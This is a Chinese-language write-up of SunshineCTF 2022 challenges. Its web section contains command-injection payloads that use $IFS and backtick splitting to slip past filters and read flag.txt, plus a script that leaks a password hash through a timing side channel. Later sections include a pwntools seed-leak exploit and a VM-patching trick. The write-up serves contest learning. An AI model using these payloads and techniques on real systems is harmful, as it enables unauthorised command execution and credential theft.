# SunshineCTF
###### tags: `CTF`

## Misc
### Roll Call
![](https://i.imgur.com/g4l5Rim.png)

santicheck

sun{here}

### Matr... I mean Discord
![](https://i.imgur.com/nrMRmm8.png)

discord -> announcement -> 頻道標題

![](https://i.imgur.com/Yt4r6Pn.png)

sun{i_love_centralized_chat_platforms}

## Web
### Inspect Element
![](https://i.imgur.com/oOLDhm8.png)

看 source code -> ctrl-F 搜尋 `sun`

![](https://i.imgur.com/ZtIcPsB.png)

sun{prepare_for_a_lawsuit}

### Network Pong
![](https://i.imgur.com/jUrSavh.png)

點進連結，看起來是一個 ping 網站的服務

![](https://i.imgur.com/r3QfR1c.png)

比方說輸入 `www.google.com`，發現確實是使用 linux 的 `ping` 指令

![](https://i.imgur.com/oOunCrJ.png)

測試輸入奇怪的 payload 如 `;`，發現會噴錯誤訊息

![](https://i.imgur.com/Dwud8hA.png)

很明顯的，有 command injection 的問題

得知命令列可能會長的類似 `/bin/bash -c {ping,-c,1, <input>}` 這樣

經測試，可以嘗試建立 payload 如下
```
localhost};$(id)
```

![](https://i.imgur.com/IMz05ir.png)

成功執行命令，但只有輸出一部分，因此嘗試在外加入 `echo`，如下
```
localhost};echo $(id)
```

但發現會有錯誤

![](https://i.imgur.com/94b6r5v.png)


經嘗試發現可能是空白字元的黑名單導致，直接用 `$IFS` 繞過
```
localhost};echo$IFS$(id)
```

![](https://i.imgur.com/DVY9tRn.png)

成功繞過

順便，使用 `ls` 查看檔案
```
localhost};echo$IFS$(ls)
```

![](https://i.imgur.com/AP9d00L.png)

出現了 `flag.txt`，嘗試進行讀取
```
localhost};echo$IFS$(cat$IFSflag.txt)
```

出現錯誤

嘗試讀錯誤訊息，有出現不要提到貓科動物之類的，推測是有擋 `cat` 指令

![](https://i.imgur.com/9yug8To.png)

嘗試在指令中加入 `` 符號，規避單字的黑名單

```
localhost};echo$IFS$(ca``t$IFSflag.txt)
```

出了一點錯

![](https://i.imgur.com/H41LaAb.png)

嘗試修正命令

```
localhost};echo$IFS$(c``at$IFS``flag.txt)
```

![](https://i.imgur.com/e5GgFxc.png)

pwned!

sun{pin9_pin9-pin9_f1@9_pin9}

### Timely!
![](https://i.imgur.com/DkatlUc.png)

進到頁面，除了有一個 yt 影片之外還有一個 login 連結

![](https://i.imgur.com/9Zosvoi.png)

login 需要帳號密碼

![](https://i.imgur.com/fjsDzXM.png)

相關處理函式在檢視頁面來源中，可以看到有一個 index.js
```javascript=
function validate(a) {
    unameObj = document.getElementById('username')
    passObj = document.getElementById('password')

    hashObj = new jsSHA("SHA-1", "TEXT", {
        numRounds: 1
    });
    hashObj.update(passObj.value)
    hash = hashObj.getHash("HEX");
    console.log(hash)

    xhr = new XMLHttpRequest()
    xhr.open("POST", "/login")
    xhr.setRequestHeader("Content-Type", "application/json")
    xhr.send(JSON.stringify({
        "username": unameObj.value,
        "password": hash
    }))


    xhr.onload = (e) => {
        // console.log("Received Response!")
        console.log(e)
        if (e.currentTarget.status == 401) {
            document.getElementById('error').innerHTML = `Error: ${e.currentTarget.response}`
        } else {
            document.getElementById('flag').innerHTML = `WOW!: ${e.currentTarget.response}`
        }
    }
}
```

簡單的來說，會 post 帳號及 sha1 後的密碼到 `/login` 的 endpoint，如果回傳碼是 401 則錯誤反之會拿到 flag 的內容

假如隨便輸入，會回傳 `You're not a true fan :C` 的錯誤訊息

![](https://i.imgur.com/uSaumTz.png)


初步看起來沒有 XXE 或是 SQLi 等漏洞

不過根據題目名稱提示，看起來和時間之類的有關，所以嘗試看看是不是有留 development 時的一些東西

嘗試了 `.git` 和 `backup.zip` 等都沒看到，但發現了 `robots.txt`，且裡面有 `/dev` 的路徑

![](https://i.imgur.com/7PnjSRe.png)

而底下還有 `/hostname` 和 `/users` 的子路徑

![](https://i.imgur.com/ULr9oyB.png)

`/dev/hostname` 回傳 Internal Server Error，看起來沒有特別東西

而 `/dev/users` 就有趣了，可以看到有 `anri` 的帳號且是啟用中

![](https://i.imgur.com/DEkua7F.png)

由此可知帳號名稱為 `anri`

在登入頁面的地方，假如帳號名稱為 `anri` 的話，錯誤訊息會變成 `Nope. Wrong.`，與隨便輸入的情況不同

![](https://i.imgur.com/whuKTWa.png)

不過密碼的部分還是不知道

觀察後發現，當使用者填入 `anri` 時，在 header 的地方會出現 `debug-lag-fix`，反之則沒有，看起來很可疑

![](https://i.imgur.com/98zMQbY.png)

此外也從題目名稱可知這題跟時間有關，所以會不會可以用時間長短的不同作為 side channel 來 leak 出密碼呢? 經測試發現似乎可以

不過經測試，不是直接 leak 出密碼，而是需要 leak 加密後的 hash

script:
```python=
import requests
import string

alphabet = string.digits + "abcdef"

h0 = ['f']
for i in range(40-len(h0)):
	max_item = ('a', 0)
	hh = h0 + ['a' for _ in range(40 - len(h0))]
	
	for a in alphabet:
		hh[len(h0)] = a
		password = "".join(hh)
		res = requests.post(
			'https://timely.web.2022.sunshinectf.org/login', 
			headers={'content-type':'application/json'}, 
			data='{"username":"anri", "password":"'+ password + '"}', 
			verify=False)
		latency = res.headers['Debug-Lag-Fix'][:-2]
		if(int(latency) > max_item[1]):
			max_item = (a, int(latency))
	h0.append(max_item[0])
	print(h0, max_item)

print(h0)
```

大概 leak 到第 38 個時會發生 `KeyError: 'debug-lag-fix'` 的錯誤，這是恰巧在第 40 位是 `a` 且在 leak 第 39 位時就成功破出 hash

總之，破出的 hash 為 `f14586d91fbab8cbd70d3946495a0213066a226a`

用 curl 送個封包，拿到 flag
```bash=
curl -X POST -k -v https://timely.web.2022.sunshinectf.org/login -H "content-type: application/json" --data '{"username": "anri", "password": "f14586d91fbab8cbd70d3946495a0213066a226a"}'
```

![](https://i.imgur.com/V3w7AaY.png)

SUN{ci+ypopi56e5+pop2022}

## Crypto
### Exotic Bytes
![](https://i.imgur.com/Yp4360l.png)

題目給了一串韓文 ~~可是我不會韓文~~
```
걳걵걮걻걢갴걳갳걟갱갲갸걟갱갵걟걢갱건걟걲갳걭갴거거갱걮걧걽
```

經嘗試，推測可能跟 unicode 編碼有關，使用[工具](https://www.ifreesite.com/unicode-ascii-ansi.htm)轉換後的編碼如下

```!
\uac73\uac75\uac6e\uac7b\uac62\uac34\uac73\uac33\uac5f\uac31\uac32\uac38\uac5f\uac31\uac35\uac5f\uac62\uac31\uac74\uac5f\uac72\uac33\uac6d\uac34\uac70\uac70\uac31\uac6e\uac67\uac7d
```

後兩位看起來好像是 ascii，使用工具萃取資料，得到 flag

![](https://i.imgur.com/fx0SBj6.png)

也可以直接用[這個 workflow](https://gchq.github.io/CyberChef/#recipe=Escape_Unicode_Characters('%5C%5Cu',false,4,true)Find_/_Replace(%7B'option':'Simple%20string','string':'%5C%5CuAC'%7D,'',true,false,true,false)From_Hex('Auto')&input=6rGz6rG16rGu6rG76rGi6rC06rGz6rCz6rGf6rCx6rCy6rC46rGf6rCx6rC16rGf6rGi6rCx6rG06rGf6rGy6rCz6rGt6rC06rGw6rGw6rCx6rGu6rGn6rG9) 一次處理

sun{b4s3_128_15_b1t_r3m4pp1ng}

### (X)AESChall
![](https://i.imgur.com/HUKZ87h.png)

:::spoiler aeschall.py
```python=
# new code!

import os
    
      
def main():
    boxxed = [105, 121, 73, 89, 41, 57, 9, 25, 233, 249, 201, 217, 169, 185, 137, 153, 104, 120, 72, 88, 40, 56, 8, 24, 232, 248, 200, 216, 168, 184, 136, 152, 107, 123, 75, 91, 43, 59, 11, 27, 235, 251, 203, 219, 171, 187, 139, 155, 106, 122, 74, 90, 42, 58, 10, 26, 234, 250, 202, 218, 170, 186, 138, 154, 109, 125, 77, 93, 45, 61, 13, 29, 237, 253, 205, 221, 173, 189, 141, 157, 108, 124, 76, 92, 44, 60, 12, 28, 236, 252, 204, 220, 172, 188, 140, 156, 111, 127, 79, 95, 47, 63, 15, 31, 239, 255, 207, 223, 175, 191, 143, 159, 110, 126, 78, 94, 46, 62, 14, 30, 238, 254, 206, 222, 174, 190, 142, 158, 97, 113, 65, 81, 33, 49, 1, 17, 225, 241, 193, 209, 161, 177, 129, 145, 96, 112, 64, 80, 32, 48, 0, 16, 224, 240, 192, 208, 160, 176, 128, 144, 99, 115, 67, 83, 35, 51, 3, 19, 227, 243, 195, 211, 163, 179, 131, 147, 98, 114, 66, 82, 34, 50, 2, 18, 226, 242, 194, 210, 162, 178, 130, 146, 101, 117, 69, 85, 37, 53, 5, 21, 229, 245, 197, 213, 165, 181, 133, 149, 100, 116, 68, 84, 36, 52, 4, 20, 228, 244, 196, 212, 164, 180, 132, 148, 103, 119, 71, 87, 39, 55, 7, 23, 231, 247, 199, 215, 167, 183, 135, 151, 102, 118, 70, 86, 38, 54, 6, 22, 230, 246, 198, 214, 166, 182, 134, 150]
    flag = open("flag.txt", "rb").read()
    plaintext = b"Here is your flag: " + flag
    while len(plaintext) % 16 != 0:
        plaintext += b"\x00"
    ciphertext = b"" 
    key = os.urandom(16)
    cipher = AES(key, Sbox=boxxed)
    while len(plaintext) > 0:
        ciphertext += cipher.encrypt(plaintext[:16])
        plaintext = plaintext[16:]
    print("Try to recover the flag! ", ciphertext.hex())
        
if __name__ == "__main__":
    main()
    
    
# When ran with the correct flag it outputs the following, can you recover it?
# Try to recover the flag!  725af38e9584f694638a7323e44749c5ba1e175e61f1bd7cf356da50e7c182cf7ed5ea6e12294f697f3b59b125a3940bc86ca5cfad39b4da4be547dcafbbb17b
```
:::

以下參考別人的解法
![](https://i.imgur.com/gm0c1Mq.png)

![](https://i.imgur.com/SBWOLbL.png)

根據題目提示，這題使用了自定義的 Sbox，而在 AES 設計中 sbox 是用來提供非線性的轉換，如果設計不當則會造成整個加解密是線性的，也就有機會解出明文

首先，先確認 AES 是否線性，根據[這篇文章](https://crypto.stackexchange.com/questions/63693/s-box-and-its-linearity)的截圖，可以使用下面公式來確認

![](https://i.imgur.com/iZ2Xmpg.png)

:::spoiler test_sbox.py
```python=
from aeschall import AES

sbox = [...]
def xor(a:bytes, b:bytes) ->bytes:
    return bytes([aa^bb for aa,bb in zip(a,b)])

import os
key = os.urandom(16)
m1 = os.urandom(16)
m2 = os.urandom(16)
m3 = os.urandom(16)
cipher = AES(key, Sbox=sbox)
res1 = xor(xor(cipher.encrypt(m1), cipher.encrypt(m2)), cipher.encrypt(m3))
res2 = cipher.encrypt(xor(xor(m1, m2), m3))
assert res1 == res2
```
:::

結果確認出 sbox 是線性，所以 AES 的加解密是線性的

而參考[這篇文章](https://crypto.stackexchange.com/questions/20228/consequences-of-aes-without-any-one-of-its-operations/70107#70107)，得知一個線性的 AES 可以被 model 成 $c = A \times p + k$，其中的 $p$, $c$ 是明文和密文並屬 GF(2) (也就是 bits)，而 $A$ 是一 128x128 並屬於 GF(2) 的矩陣，與 AES 結構有關而與 key 無關，至於 $k$ 則是一個與 key 相關的向量，一樣屬於 GF(2)

因此我們可以想辦法求出 $A$ 和 $k$ 參數，也就可以自由的加解密了

在求 $A$ 參數的部分，可以先隨便生成一個 key 並創建 128 個每次只有單一個 bit 為 1 的明文並計算出密文，並計算明文為全部 bits 為 0 時的密文，並將前面密文減去全 0 明文的密文，並做矩陣求解即可，換言之即為以下公式

$p_0 = \begin{bmatrix} 0 \\ 0 \\ \vdots \\ 0 \end{bmatrix}$
$p_1 = \begin{bmatrix} 1 \\ 0 \\ \vdots \\ 0 \end{bmatrix}$
$p_2 = \begin{bmatrix} 0 \\ 1 \\ 0 \\ \vdots \\ 0 \end{bmatrix}$
$p_n = \dots$
$p_{128} = \begin{bmatrix} 0 \\ \vdots \\ 0 \\ 1 \end{bmatrix}$
$c_0 = A \times p_0 + k$
$c_1 = A \times p_1 + k$
$...$
$c_{128} = A \times p_{128} + k$
$\begin{aligned}
C &= \begin{bmatrix} c_1 - c_0, c_2-c_0, \dots , c_{128} - c_0 \end{bmatrix} \\
&= \begin{bmatrix} (A \times p_1 + k) - (A \times p_0 + k), \dots , (A \times p_{128} + k) - (A \times p_0 + k) \end{bmatrix} \\
&= \begin{bmatrix} A \times (p_1 - p_0), \dots , A \times (p_{128} - p_0) \end{bmatrix} \\
&=  A \times \begin{bmatrix} (p_1 - p_0), \dots , (p_{128} - p_0) \end{bmatrix} \\
&=  A \times \begin{bmatrix} p_1, \dots , p_{128} \end{bmatrix} \\
&=  A \times P \\
\end{aligned}$

而既然可以得知 $A$，且另外也可在題目中知道有已知明文和對應的密文，因此可再進一步求出此次加密的 k 向量，即以下公式

$c = A \times p + k$
$k = c - A \times p$

而在已知相關參數的情況下，即可自由解密密文

:::spoiler solve.py
```python=
from aeschall import AES

sbox = [...]
ct_flag = bytes.fromhex("725af38e9584f694638a7323e44749c5ba1e175e61f1bd7cf356da50e7c182cf7ed5ea6e12294f697f3b59b125a3940bc86ca5cfad39b4da4be547dcafbbb17b")
pt_flag = b"Here is your flag: "

def xor(a:bytes, b:bytes) ->bytes:
    return bytes([aa^bb for aa,bb in zip(a,b)])
def bits2bytes(x: list) -> bytes:
    return bytes([int("".join(map(str, x[i:i+8])), 2) for i in range(0, len(x), 8)])
def bytes2bits(x: bytes) -> list:
    return list(map(int, "".join(map(lambda x: f"{x:08b}", x))))

# find encryption model
# https://crypto.stackexchange.com/questions/20228/consequences-of-aes-without-any-one-of-its-operations/70107#70107
from sage.all import GF, matrix, vector

## c = Ax+k
## c-c0 = A(x-x0)
## C = AX
key = os.urandom(16)
X = []
C = []
cipher = AES(key, Sbox=sbox)
base = cipher.encrypt(bits2bytes([0]*128))
for i in range(128):
    pt = [0]*i + [1] + [0]*(127-i)
    ct = cipher.encrypt(bits2bytes(pt))
    X.append(pt)
    C.append(bytes2bits(xor(ct,base)))

mat_X = matrix(GF(2), X).transpose()
mat_C = matrix(GF(2), C).transpose()
mat_A = mat_X.solve_left(mat_C)

vec_c = vector(bytes2bits(ct_flag[:16]))
vec_x = vector(bytes2bits(pt_flag[:16]))
vec_k = vec_c - mat_A * vec_x

# solve
## c = Ax+k
## c-k = Ax
flag = b""
for i in range(0, len(ct_flag), 16):
    curr_ct = vector(bytes2bits(ct_flag[i:i+16]))
    curr_pt = mat_A.solve_right(curr_ct - vec_k)
    flag += bits2bytes(curr_pt)

print(flag)
```
:::

sun{a3$_r34lly_n33ds_sub5tituti0n!}

## Re
### Lets-a-Go!
![](https://i.imgur.com/EbQtnpl.png)

丟 ghidra 後，在 strings 處發現 `UPX` 字樣，推測程式使用 UPX 殼
![](https://i.imgur.com/gYvAzGi.png)

使用 upx 進行脫殼
```bash=
 ~/upx-4.0.1-i386_linux/upx -d plumber_game -o plumber_game_unupx
```

脫殼後，用 strings 發現有許多 fmt 開頭的方法，加上題目名稱提示，推測是 golang 寫的程式

![](https://i.imgur.com/AdJeOkm.png)

使用 ida 來逆向，發現在 main 中會進行輸入的判斷，假設判斷成功就會進入 `Password accepted! Dispensing flag...` 的流程，反之進入 `Invalid password. Try again later!` 流程

判斷部分如下

![](https://i.imgur.com/EyFV0xR.png)

因此可知，輸入 `@t4r1_2600_l0v3r` 即是正確的 password

![](https://i.imgur.com/BNA6BxO.png)

sun{go_to_the_other_castle}

### MiddleEndian
![](https://i.imgur.com/ch5N81K.png)

題目給了一個壞掉的 png 檔案，要求復原

![](https://i.imgur.com/pDFRE13.png)

正確的 png header 為 `89 50 4e 47 0d 0a 1a 0a`，但檔案中僅有奇數位置的 byte 正確

原本根據題目名稱 middle endian 猜測是跟 bit 順序有關，但試了之後找不出來

無意間翻到最後面，發現偶數 byte 的部分似乎被藏在這裡

![](https://i.imgur.com/of6qASj.png)

寫了一個腳本來解
```python=
with open("flag.png.me", "rb") as fh:
    data = fh.read()

decode = b""
for i in range(len(data)):
    if(i%2 == 0):
        decode += bytes([data[i]])
    else:
        decode += bytes([data[-i]])

with open("flag.png", "wb") as fh:
    fh.write(decode)
```

解出來如下

![](https://i.imgur.com/Wk4u0ej.png)

雖然還是有點問題，不過可以直接看出 flag 了

sun{byt3s_1n_d1s4rr@y}

## Pwn
### CTF Simulator
![](https://i.imgur.com/a80fo3O.png)

程式擷取如下，基本上就是一個猜數字遊戲

![](https://i.imgur.com/cnrcydj.png)

而 srand 之類的有設定且是由 `/dev/urandom` 來讀取，所以基本上沒有其他漏洞的話是猜不到 seed 的

不過在輸入 teamname 的地方有漏洞，輸入之後會複製內容到 0x104430 的位置並複製 14 個字元，而 random seed 存的地方剛好是 0x104444 的位置，而輸出的格式是 `%s`，因此當輸入 teamname 長度 14 字元以上時輸出部分會將 teamname 和 random seed 一起印出來，可以洩漏 random seed，而洩漏出來後，random 的數字即可得知

由於 c 的 random 和 python 的 random 產生的方式不同，因此有額外寫了一個 c 的程式來獲得 random number

```c=
// getnumber.c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char* argv[]) {
    if(argc != 2)
    {
        exit(1);
    }
    srand(atoi(argv[1]));
    for(int i=10; i<1000000000; i*=10)
    {
        int num = rand() % i + 1;
        printf("%d\n", num);
    }
    return 0;
}
```

以下為主要的 python 程式

```python=
from pwn import *
from Crypto.Util.number import bytes_to_long
import subprocess
binary = "./ctf-simulator"

context.terminal = ["cmd.exe", "/c", "start", "bash.exe", "-c"]
context.log_level = "debug"
context.binary = binary

conn = remote("sunshinectf.games", 22000)
#conn = process(binary)
#conn = gdb.debug(binary, "break *0x804809c\\nbreak main")

conn.sendlineafter(b"CTF team?\n", b"A" * 0x14)
data = conn.recvuntil(b"I'm").strip()[:-5]
seed = data[-4:]
seed = bytes_to_long(seed[::-1])

numbers = subprocess.run(["./getnumber", str(seed)], capture_output=True).stdout.split(b'\n')

for i in range(8):
    conn.sendlineafter(b"What is it?\n", numbers[i])

conn.interactive()
```

sun{gu355y_ch4ll3ng35_4r3_my_f4v0r1t3!}

## Pegasus
### PEG_GIMME
![](https://i.imgur.com/GAy6xRN.png)

下載後跑就對了

![](https://i.imgur.com/jUvlPWL.png)

sun{th4t_w4s_3a5y}

### PEG_DEBUG
![](https://i.imgur.com/3CRcZH1.png)

沒有檔案，只能用 debug 模式去找 flag

他的 debug tool 有點類似 GDB，詳細可以用 help 指令來讀相關資訊

首先先用 `disass` 指令 leak 出 assembly code，全部 leak 出來的指令如下，且也自行做了一些註解

```
; disass 100 0x100
0100.0000: MOV     A0, A0
0102.0000: BRA.EQ  RD, RA
0104.0000: MOV     A4, 0x7F
0108.0000: LDB     A2, [A0]
010A.0000: INC     A0, 1
010C.0000: AND     A3, A2, A4
010F.0000: WRB     (0), A3
0111.0000: CMP     A2,  A3
0113.0000: BRR.GT  0xFFF2		; 0108
0116.0000: BRA     RD, RA

0118.0000: MOV     S0, ZERO
011A.0000: RDB     S1, (15)
011C.0000: BRR.GE  0xC			; 012b
011F.0000: RDB     A0, (0)
0121.0000: BRR.GE  0xC			; 0130
0124.0000: SUB     A0, S1
0126.0000: ORR     S0, A0
0128.0000: BRR     0xFFEF		; 011a
012B.0000: MOV     S0, S0
012D.0000: BRR.EQ  0x8			; 0138
0130.0000: ADD     A0, PC, 0xC	; a0 = 0x141 = "Loser!\n"
0135.0000: BRR     0x5			; 013d
0138.0000: ADD     A0, PC, 0xB	; a0 = 0x148 = "Winner!\n"
013D.0000: FCR     0xFFC0		; 0100
0140.0000: HLT
```

此外也有一些 static string 的部分，使用 `hexdump` 指令列出來

```
; hexdump R 0x140 20
0140: fecc eff3 e5f2 a10a d7e9 eeee e5f2 a10a  ................
0150: 0000 0000 0000 0000 0000 0000 0000 0000  ................
```

其中可以看到，會讀取 device 15 和 stdin 的資料，並進行相關比較，如果比較結果一致會進入 winner 路線否則進入 loser 路線

而可以在 debug 到指令 0118 的地方查看 s1 register，即可得知 device 15 的內容，也就能進到 winner 路線

監聽到的資訊如下:
```
73 75 6e 7b 64 31 64 5f 79 30 75 5f 75 35 33 5f 62 72 33 34 6b 70 30 31 6e 74 35 3f 7d
```

內容為 `sun{d1d_y0u_u53_br34kp01nt5?}`，即是 flag

sun{d1d_y0u_u53_br34kp01nt5?}

### PEG_CHEAT
![](https://i.imgur.com/lLCVEzk.png)

首先直接 dump assembly 出來

以下是 main 的部分

:::spoiler main.asm
```
main: 
0472.0000: MOV     FP, SP
0474.0000: SUB     SP, 0xC
0478.0000: ADD     A0, PC, 0xFFB0       ; A0 = 0x42d = "Enter cheat code?" (& 0x7f)
047D.0000: FCR     0xFC80               ; call 0x100 puts
0480.0000: MOV     A0, SP
0482.0000: MOV     A1, 0xB
0486.0000: FCR     0xFC8F               ; call 0x118 read
0489.0000: ADD     A0, PC, 0xFFB1       ; A0 = 0x43f = "UUDDLRLRBA" (& 0x7f)
048E.0000: MOV     A1, SP
0490.0000: FCR     0xFF78               ; call 0x40b cmp
0493.0000: MOV     A1, A1
0495.0000: BRR.NE  0x65                 ; 0x4fd
0498.0000: ADD     A0, PC, 0xFFAD       ; A0 = 0x44a = "Address to patch?" (& 0x7f)
049D.0000: FCR     0xFC60               ; call 0x100 puts
04A0.0000: RDB     A0, (0)
04A2.0000: HLT.GE
04A3.0000: FCR     0xFF40               ; call 0x3e6 hexToInt
04A6.0000: MOV     S0, A1
04A8.0000: RDB     A0, (0)
04AA.0000: HLT.GE
04AB.0000: FCR     0xFF38               ; call 0x3e6 hexToInt
04AE.0000: SHL     S0, 0x4
04B2.0000: ORR     S0, A1
04B4.0000: RDB     A0, (0)
04B6.0000: HLT.GE
04B7.0000: FCR     0xFF2C               ; call 0x3e6 hexToInt
04BA.0000: SHL     S0, 0x4
04BE.0000: ORR     S0, A1
04C0.0000: RDB     A0, (0)
04C2.0000: HLT.GE
04C3.0000: FCR     0xFF20               ; call 0x3e6 hexToInt
04C6.0000: SHL     S0, 0x4
04CA.0000: ORR     S0, A1
04CC.0000: RDB     A0, (0)
04CE.0000: CMP     A0,  0xA
04D2.0000: HLT.NE
04D3.0000: ADD     A0, PC, 0xFF84       ; A0 = 0x45c = "Byte to replace with?" (& 0x7f)
04D8.0000: FCR     0xFC25               ; call 0x100 puts
04DB.0000: RDB     A0, (0)
04DD.0000: HLT.GE
04DE.0000: FCR     0xFF05               ; call 0x3e6 hexToInt
04E1.0000: MOV     S1, A1
04E3.0000: RDB     A0, (0)
04E5.0000: HLT.GE
04E6.0000: FCR     0xFEFD               ; call 0x3e6 hexToInt
04E9.0000: SHL     S1, 0x4
04ED.0000: ORR     S1, A1
04EF.0000: RDB     A0, (0)
04F1.0000: CMP     A0,  0xA
04F5.0000: HLT.NE
04F6.0000: MOV     A0, S0
04F8.0000: MOV     A1, S1
04FA.0000: FCR     0xFE8B               ; call 0x388 patch
04FD.0000: FCR     0xFE07               ; call 0x307 gamemain
0500.0000: HLT
```
:::

可以看到，程式會先要求輸入 cheat code，假如輸入錯誤會直接進入遊戲流程，否則會先進入到 patch 的流程再進行遊戲，cheat code 為程式內的字串 `UUDDLRLRBA`

在 patch 流程的部分會要求輸入要 patch 的位置及要 patch 的值，僅能輸入一次

以下是 patch 的子函數
:::spoiler patch.asm
```
patch (A0: pos, A1: val):
0388.0000: PSH     {RA-RD}
038B.0000: CMP     A0,  0x1F6
038F.0000: BRR.LT  0x4B                 ; 0x3dd
0392.0000: CMP     A0,  0x377
0396.0000: BRR.GE  0x44                 ; 0x3dd
0399.0000: SRU     A2, A0, 0x8
039E.0000: SHL     A2, 0x2
03A2.0000: ADD     A2, 0xFC02
03A6.0000: LDB     A3, [A2]
03A8.0000: INC     A2, -1
03AA.0000: STB     [A2], A3
03AC.0000: STB     [A0], A1
03AE.0000: POP     {PC-DPC}

03DD.0000: ADD     A0, PC, 0xFFCF       ; A0 = 0x3b1 = "Address is outside of the patchable region!" (& 0x7f)
03E2.0000: FCR     0xFD1B               ; call 0x100 puts
03E5.0000: HLT
```
:::

其中可以看到會有限制 patch 的位置只能在 `0x1f6` ~ `0x377` 之間

而以下為遊戲本體的程式

:::spoiler game.asm
```
gamemain:
0307.0000: PSH     {S0-S1, RA-RD}
030A.0000: ADD     A0, PC, 0xFF8F       ; A0 = 0x29e = "Welcome to the Silicon Bridge game!" (& 0x7f)
030F.0000: FCR     0xFDEE               ; call 0x100 puts
0312.0000: MOV     S0, ZERO
0314.0000: ADD     S1, PC, 0xFE2F       ; S1 = 0x148
0319.0000: LDW     S1, [S1]
031B.0000: BRR     0x47                 ; goto 0x365
031E.0000: FCR     0xFED5               ; call 0x1f6 genboard
0321.0000: ADD     A0, PC, 0xFF9C       ; A0 = 0x2c2 = "Pick a silicon panel to jump forwards to. [L/R]?" (& 0x7f)
0326.0000: FCR     0xFDD7               ; call 0x100 puts
0329.0000: RDB     A1, (0)
032B.0000: HLT.GE
032C.0000: CMP     A1,  0x4C            ; 'L'
0330.0000: MOV.EQ  A1, ZERO
0332.0000: BRR.EQ  0x9                  ; goto 0x33e
0335.0000: CMP     A1,  0x52            ; 'R'
0339.0000: HLT.NE
033A.0000: MOV     A1, 0x1
033E.0000: RDB     A2, (0)
0340.0000: HLT.GE
0341.0000: CMP     A2,  0xA
0345.0000: HLT.NE
0346.0000: ADD     A2, PC, 0xFDFF       ; A2 = 0x14a
034B.0000: LDW     A2, [A2]
034D.0000: SRU     A2, S0
034F.0000: AND     A2, 0x1
0353.0000: CMP     A2,  A1
0355.0000: BRR.NE  0x12                 ; goto 0x36a
0358.0000: ADD     A3, PC, 0x2A3        ; A3 = 0x600
035D.0000: LDW     A4, [A3]
035F.0000: INC     A4, 1
0361.0000: STW     [A3], A4
0363.0000: INC     S0, 1
0365.0000: CMP     S0,  S1
0367.0000: BRR.LT  0xFFB4               ; 0x31e
036A.0000: CMP     S0,  S1
036C.0000: BRR.GT  0xB                  ; goto 0x37a
036F.0000: ADD     A0, PC, 0xFF7F       ; A0 = 0x2f3 = "/You Died/" (& 0x7f)
0374.0000: FCR     0xFD89               ; call 0x100 puts
0377.0000: HLT
0378.0000: HLT
0379.0000: HLT
037A.0000: ADD     A0, PC, 0xFF7F       ; A0 = 0x2fe = "You Win!" (& 0x7f)
037F.0000: FCR     0xFD7E               ; call 0x100 puts
0382.0000: FCR     0xFDB5               ; call 0x13a printflag
0385.0000: POP     {S0-S1, PC-DPC}
```
:::

可以看到，會先輸出一些提示文字後跳到 0x365 的指令，而後會再跳回 0x31e 印出 gameboard，開始進行遊戲，遊戲方式很簡單，會有兩排石頭可以跳，其中一塊會是陷阱而另一塊可以正常跳，需要跳到最後面

![](https://i.imgur.com/jvEDkEJ.png)

而在 assembly 可以看到，在指令 0x346 會去讀記憶體中的一塊值並與 0x1 mask，接著在指令 0x355 進行比對是否等於輸入值 (左 0 右 1)，如果不是則跳到 0x36a 的位置，而也可以看到 0x36a 會比較暫存器 S0 數值是否大於暫存器 S1，是的話會進入 you win 路線否則進入 you lose 路線，因此可以推測，在指令 0x36a 的 s0 和 s1 一個是目前跳的格數而另一個是成功所需的格數

另外可以注意的一點是，patch 的範圍有包含到 game main 的範圍，也代表說我們可以嘗試修改 byte 來改指令，使遊戲直接跳到 win 路線印出 flag

這邊我改的位置是指令 0x36c，改成數值 0x95，將 BRR.GT 指令改成 BRR.LT，因此只要隨便玩玩輸就可以進入 win 路線 (至於為什麼是 0x95，可以參考 0x367 BRR.LT 指令的 hexdump)

綜合以上，首先先輸入作弊碼 `UUDDLRLRBA` 再輸入位置 036c 數值 95，然後隨便玩，即可拿到 flag

sun{l3t5_w4tch_4n_4ct10n_R3pl4y_0f_th4t_G4m3_5h4rk!}

## Scripting
### PredictorProgrammer 1
![](https://i.imgur.com/3pEOf5X.png)

猜數字遊戲

連上後，發現吐出一些 debug info

![](https://i.imgur.com/G1yxD2h.png)

可能可以從這些資料中得到 random number

不過我只是隨便測試輸入，然後就拿到 flag 了 🤔

![](https://i.imgur.com/7OO8Ft6.png)

sun{oops_i_thought_i_was_in_release}

### PredictorProgrammer 2
![](https://i.imgur.com/mDkqQq0.png)

從提示看來，這題把 seed 遮住了，不過有跟時間有關的提示

另外，這次有提供原始碼
:::spoiler server-challenge-2.py
```python=
#!/usr/local/bin/python3
import os
import sys
import multiprocessing
import time
import random

TIME_SCALE=10000

sys.stdout.reconfigure(line_buffering=True)
next_challenge_port = os.getenv('CHALLENGE_3_PORT', 65002)
next_challenge_domain = os.getenv('CHALLENGE_3_DOMAIN', 'predictor-sequel.2022.sunshinectf.org')
flag_p2 = open('./key', "rb").read()

def test_client(stdinput):
    seed = get_time_number()
    time_in_seconds = seed // TIME_SCALE
    pretty_print_time = time.strftime("%a, %d %b %Y %H:%M:%S +0000", time.gmtime(time_in_seconds))
    lives = 16
    correct_responses = 0

    print("#debugggg seed = CENSORED\n")
    print(seed)
    print("The current date is " + pretty_print_time + ", you have 30 seconds to guess the next number correctly.")
    
    while lives > 0 and correct_responses < 5:
        next_number = knuth_linear_congruential_generator(seed)
        print(f"Predict the future... if you dare!\nYou have {lives} lives left!\nWhat number am I thinking of, from 0 to 18446744073709551615:")

        guess = int(stdinput.readline())
        
        if guess < next_number:
            print(f"That number was too small. Generating another random number...")
            lives -= 1
        elif guess > next_number:
            print(f"That number was too big. Generating another random number...")
            lives -= 1
        else:
            print('Lucky guess for that number... I don\'t trust you, so I\'ll ask some more questions to be safe...')
            correct_responses += 1
        seed = next_number
    if lives > 0:
        print("Well these codes are old but they check out...")
        sys.exit(0)
    else:
        print("Looks like those were not the codes I was looking for...")
        sys.exit(1)

# we use the time as a "random number" as it's used by the second challenge.
def get_time_number():
    return round(time.time() * TIME_SCALE)

# if knuth made it it must be secure!
def knuth_linear_congruential_generator(state):
    return ((state * 6364136223846793005) + 1442695040888963407) % (2 ** 64)

# launches a client session for a given level.
def client_thread():
    try:
        message = 'So as it turns out leaving the debug print on was a mistake.\n'
        message += '...\n'
        message += 'Well no bother. This TIME I don\'t print the seed!\n'
        message += 'In fact, you\'ll never guess what the seed is this TIME!\n'
        message += 'And if you do... well don\'t tell anyone, especially since my server may have its own TIME...\n'
